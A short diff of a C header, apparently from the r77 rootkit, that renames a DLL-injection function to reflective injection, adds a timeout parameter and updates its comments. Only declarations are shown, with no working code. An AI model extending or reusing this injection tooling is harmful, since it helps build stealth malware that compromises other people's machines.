@@ -31,11 +31,13 @@ typedef struct _R77_PROCESS
 /// <param name="processId">The process to inject the DLL in.</param>
 /// <param name="dll">A buffer with the DLL file.</param>
 /// <param name="dllSize">dllSize The size of the DLL file.</param>
+/// <param name="timeout">The number of milliseconds to wait for the DllMain method to return.</param>
 /// <returns>
 /// TRUE, if the DLL was successfully injected and DllMain returned TRUE;
 /// otherwise, FALSE.
+/// If the timeout was exceeded, this function returns FALSE.
 /// </returns>
-BOOL InjectDll(DWORD processId, LPBYTE dll, DWORD dllSize);
+BOOL InjectDllReflective(DWORD processId, LPBYTE dll, DWORD dllSize, DWORD timeout);
 /// <summary>
 /// Injects all processes with the r77 DLL.
 /// </summary>
